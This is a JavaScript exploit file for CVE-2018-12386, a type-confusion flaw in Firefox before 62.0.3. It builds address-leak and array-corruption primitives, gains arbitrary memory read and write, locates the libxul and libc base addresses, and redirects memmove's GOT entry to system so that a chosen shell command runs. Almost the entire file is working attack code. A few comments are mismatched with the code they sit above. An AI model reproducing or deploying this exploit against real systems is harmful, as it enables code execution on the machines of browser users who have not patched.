/*
 * Linux exploit for CVE-2018-12386 found by Niklas Baumstark, Samuel Gro√ü and
 * Bruno Keith affecting Firefox <v62.0.3.
 * It can be used to achieve sandboxed code execution in a content process
 * using a type confusion.
 *
 * Lyte <lyte@lyte.rs>
 *
 */


class Primitives {

    /*
     * Type confusion between an object and a double to get the address of the
     * object passed as argument.
     */
    static addrof(object) {
        for (var i = 0; i < 100; i++)
            var o1 = {s: "lyte", x: 13.37};

        for (var i = 0; i < 100; i++) 
            var o2 = {s: "lyte", y: object};

        function type_confusion(a, b) {
            let p = b;
            for (; p.s < 0; p = p.s)
                while (p === p) {}
            for (var i = 0; i < 1000000; ++i) {}
            return a.x;
        }

        type_confusion(o1, o2);
        type_confusion(o1, o2);
        return new Int64(type_confusion(o1, o2));
    }

    /*
     * Type confusion between a list of doubles and an object to modify the 4th
     * field of the object passed as parameter.
     *
     * By using this function on an array, it allows the modification of the
     * pointer to the memory buffer containing the elements of this array.
     * It can then be changed to point to an arbitrary address to read to and
     * write from it.
     */
    static corrupt_array_object(victim_addr, hax_addr) {

        var corrupter = {a: 12.34, b: 12.34, c:12.34, d:12.34};
        for (var i = 0; i < 100; i++)
            var o1 = {s: "lyte", x: corrupter};

        for (var i = 0; i < 100; i++) 
            var o2 = {s: "lyte", y: victim_addr};

        function type_confusion(a, b) {
            let p = b;
            for (; p.s < 0; p = p.s)
                while (p === p) {}
            for (var i = 0; i < 1000000; ++i) {}
            a.x.d = hax_addr;
            return a.x;
        }

        type_confusion(o1, o2);
        type_confusion(o1, o2);
        return type_confusion(o1, o2);
    }
}


class Memory {

    constructor() {
        this.victim = new Float64Array(10);
        this.hax = new Float64Array(10);

        var victim_addr = Primitives.addrof(this.victim);
        var hax_addr = Primitives.addrof(this.hax);

        this.victim = Primitives.corrupt_array_object(
                          victim_addr.double,
                          hax_addr.double,
                      );
    }

    read(addr) {
        this.victim[7] = addr.double;
        return new Int64(this.hax[0])
    }

    write(addr, value) {
        this.victim[7] = addr.double;
        this.hax[0] = new Int64(value).double;
    }
}


/*
 * Function retrieving the base address of libc.so.6 by finding the
 * address of `memmove` in libxul.so's GOT and then substracting its offset
 * in libc.so.6 from it.
 */
function get_jit_compiled_function() {
    function function_to_jit(num) {
        num += 1.234;
        for (var i = 0; i < 200; i++)
            num /= 0.1;
        num = num % 3;
        return num;
    }

    for (var i = 0; i < 1000; i++) {
        function_to_jit(12.34);
    }

    return function_to_jit;
}

class Exploit {

    constructor(offsets) {
        this.mem = new Memory();
        this.offsets = offsets;
    }

    execute_command(command) {
        this.libxul_addr = this._get_libxul_addr();
        this.libc_addr = this._get_libc_addr();
        this._execute_code(command);
    }

    /*
     * Function retrieving the base address of libxul.so by finding the
     * address of `Math.max` and then substracting its offset in libsux.so
     * from it.
     */
    _get_libxul_addr() {
        var math_max_obj_addr = Primitives.addrof(Math.max);
        var math_max_func_addr = this.mem.read(math_max_obj_addr.add(0x28));
        return new Int64(math_max_func_addr.sub(
            this.offsets['libxul_math_max']
        ));
    }

    /*
     * Function retrieving the base address of libc.so.6 by finding the
     * address of `tolower` in libxul.so's GOT and then substracting its offset
     * in libc.so.6 from it.
     */
    _get_libc_addr() {
        var memmove_got_addr = this.mem.read(
            this.libxul_addr.add(this.offsets['libxul_got_tolower'])
        );
	document.write(memmove_got_addr);
        return new Int64(memmove_got_addr.sub(this.offsets['libc_tolower']));
    }

    /*
     * Function replacing the address of `memmove` in libxul's GOT by the one of
     * `system`. Then it calls `copyWithin`, which would normally call
     * memmove(command, ...), but instead executes `system(command)`.
     * The address of `memmove` is then written back into the GOT, even if it's
     * not necessary because the whole exploit is not meant to return
     * gracefully.
     */
    _execute_code(command) {
        this.command = new Uint8Array(100);
        for (var i = 0; i < command.length; i++) {
            this.command[i] = command.charCodeAt(i);
        }
        this.command[command.length] = 0;
        this.mem.write(
            this.libxul_addr.add(this.offsets['libxul_got_memmove']),
            this.libc_addr.add(this.offsets['libc_system'])
        );
        this.command.copyWithin(0, 1);
        this.mem.write(
            this.libxul_addr.add(this.offsets['libxul_got_memmove']),
            this.libc_addr.add(this.offsets['libc_memmove'])
        );
    }
}
